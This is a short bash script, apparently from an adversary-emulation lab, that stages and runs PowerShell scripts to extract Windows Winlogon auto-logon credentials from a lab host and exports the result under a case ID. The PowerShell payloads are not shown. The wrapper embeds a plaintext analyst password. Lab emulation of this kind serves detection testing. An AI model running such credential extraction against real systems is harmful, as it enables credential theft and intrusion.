#!/usr/bin/env bash
# T035A — Winlogon auto-logon credential extraction on mbr01
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T035A-WINLOGON-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T035A | ${CASE_ID} | T0=${T0} ==="

campaign_stage_file campaign-a-t043-system-exec.ps1
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t035a-winlogon-creds.ps1 child.cadre.local \
  "-Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!'")"
printf '%s\n' "${OUT}"
campaign_require_ok T035A-WINLOGON "${OUT}" 'WINLOGON_AUTOLOGON|T035A_WINLOGON_OK'

cadre_export "${CASE_ID}" T035A "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T035A complete ==="
